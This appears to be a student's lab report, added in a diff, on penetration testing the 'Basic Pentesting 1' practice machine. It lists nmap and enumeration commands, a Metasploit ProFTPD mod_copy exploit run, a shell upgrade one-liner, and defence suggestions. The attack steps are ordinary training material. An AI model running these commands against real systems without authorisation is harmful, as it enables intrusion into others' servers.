@@ -1,1 +1,134 @@
+# 🛡️ Cybersecurity Lab Project Report
 
+---
+
+## **Project Title:**
+
+**Penetration Testing of Basic Pentesting 1 Machine using Nmap and Metasploit**
+
+---
+
+### **Submitted By:**
+
+**Sandhya Shree B V**
+USN: 1VJ22CS044
+Department of Computer Science & Engineering
+6th Semester
+**Vijaya Vittala Institute of Technology**
+Bangalore – 560077
+
+**Date:02 June 2025
+**Subject:** Cybersecurity Lab – Penetration Testing Project Report
+
+---
+
+## 📌 Objective
+
+The objective of this project is to learn practical penetration testing using open-source tools. The tasks include scanning and identifying open ports using Nmap, finding vulnerabilities, exploiting them using Metasploit, gaining shell access, and documenting the entire process like a real-world penetration test report.
+
+---
+
+## 🔍 IP Discovery
+
+* **Tool Used:** `netdiscover`
+* **Command:**
+
+  ```
+  netdiscover -r 192.168.56.0/24
+  ```
+* **Result:** Target machine discovered with IP address `192.168.56.101`
+
+---
+
+## 📡 Nmap Scan Results
+
+* **Command:**
+
+  ```
+  nmap -sC -sV -oN basicpentest_nmap.txt 192.168.56.101
+  ```
+* **Findings:**
+
+  * Port 21/tcp open – FTP (ProFTPD)
+  * Port 22/tcp open – SSH (OpenSSH)
+  * Port 80/tcp open – HTTP (Apache)
+
+---
+
+## 🔐 Enumeration Outputs
+
+* **Tools Used:**
+
+  * `nikto` (web vulnerability scanning)
+  * `enum4linux` (SMB enumeration)
+  * `hydra` (brute-force login attempts)
+
+* **Findings:**
+
+  * `nikto`: Detected potential vulnerabilities and default web files.
+  * `enum4linux`: Listed SMB shares and user accounts.
+  * `hydra`: Attempted brute-force login on FTP and SSH services.
+
+---
+
+## 💣 Exploitation Steps
+
+* **Metasploit Module Used:**
+
+  ```
+  exploit/unix/ftp/proftpd_modcopy_exec
+  ```
+
+* **Commands Used:**
+
+  ```
+  msfconsole
+  use exploit/unix/ftp/proftpd_modcopy_exec
+  set RHOSTS 192.168.56.101
+  set RPORT 21
+  run
+  ```
+
+* **Result:** Gained shell access through ProFTPD vulnerability.
+
+---
+
+## 🐚 Post-Exploitation
+
+* **Shell Upgraded Using:**
+
+  ```
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  ```
+
+* **Commands Executed:**
+
+  ```
+  whoami
+  id
+  uname -a
+  ```
+
+* **Flag Captured:**
+  Found in `/home/user/flag.txt`
+  *(Insert flag content here)*
+
+---
+
+## 🧠 Lessons Learned
+
+* Learned to effectively use scanning and enumeration tools such as Nmap, Nikto, and Enum4linux.
+* Understood how Metasploit modules work and how to select the right one for exploitation.
+* Gained experience in post-exploitation tasks including shell upgrade and privilege checking.
+* Improved documentation skills for penetration testing reports.
+
+---
+
+## 🛡️ Defense Suggestions
+
+* Disable unused services such as FTP.
+* Regularly update and patch vulnerable services.
+* Enforce strong password policies and account lockouts.
+* Implement proper firewall rules and logging mechanisms.
+
+---
